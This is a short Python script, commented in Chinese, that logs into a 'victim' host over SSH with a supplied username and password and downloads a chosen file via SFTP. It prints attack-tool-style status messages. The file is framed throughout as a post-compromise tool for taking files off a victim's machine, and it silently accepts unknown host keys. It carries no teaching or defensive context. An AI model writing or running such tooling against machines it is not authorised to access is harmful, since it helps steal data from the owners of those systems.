import paramiko
import sys

def download_file(victim_ip, username, password, remote_file, local_path):
    try:
        # 建立 SSH 連線
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(victim_ip, username=username, password=password)

        # 使用 SFTP 下載檔案
        sftp = client.open_sftp()
        sftp.get(remote_file, local_path)
        sftp.close()

        print(f"[+] Successfully downloaded {remote_file} to {local_path}")
        client.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python download_file.py <Victim IP> <Username> <Password> <Remote File> <Local File>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    remote_file = sys.argv[4]
    local_file = sys.argv[5]

    download_file(victim_ip, username, password, remote_file, local_file)